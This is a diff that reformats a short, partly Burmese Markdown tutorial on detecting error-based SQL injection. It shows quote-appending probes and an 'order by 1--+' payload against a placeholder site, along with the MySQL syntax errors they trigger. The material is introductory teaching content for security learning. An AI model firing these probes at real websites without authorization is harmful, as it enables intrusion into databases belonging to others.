@@ -4,14 +4,18 @@ This is probably the easiest vulnerability along the SQL Injection attack. An at
 
 ## Detecting the vulnerability
 ```
-<code>https://site.com/index.php?id=1</code>
+https://site.com/index.php?id=1
+```
 Website load successfully.
 
 အဲ့တာကိုကျွန်တော်တို့ အနောက်ကနေ ' လေးထည့်ပေးလိုက်ရင် အောက်ကပုံစံမျိုး error message ကျလာမှာဖြစ်ပါတယ်။
-<code>https://site.com/index.php?id=1'</code>
+```
+https://site.com/index.php?id=1'
+```
 Error message show up: <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near...</code>
-
-<code>https://site.com/index.php?id=1\'</code>
+```
+https://site.com/index.php?id=1\'
+```
 Error message show up: <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near...</code>
 
 <code>https://site.com/index.php?id=1 and 0' order by 1--+</code>
